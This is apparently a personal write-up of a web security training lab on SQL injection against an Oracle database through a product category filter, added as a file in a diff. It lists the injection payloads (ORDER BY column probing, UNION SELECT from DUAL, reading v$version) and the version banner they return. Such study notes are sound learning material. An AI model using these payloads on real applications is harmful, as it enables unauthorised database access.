@@ -1,0 +1,26 @@
+LAB-07- SQL Injection Attack, querying the database type and version on oracle
+
+SQL injection- Prodcut Category filter
+
+End Goal: Display the version string
+
+Analysis:
+1. Determine the number or columns
+' order by 2--
+No error
+
+' order by 3--
+error
+So 2 columns
+
+2. Determine the data types
+' UNION Select NULL,'a'-- # error
+' UNION SELECT 'a', NULL-- Not Working Because ORACLE needs a from clause
+We can use a dummy table for that called DUAL
+
+' UNION SELECT 'a', 'a' from DUAL--
+
+3. Output the version of the database
+SELECT banner FROM v$version
+So, ' UNION SELECT banner,NULL FROM v$version--
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
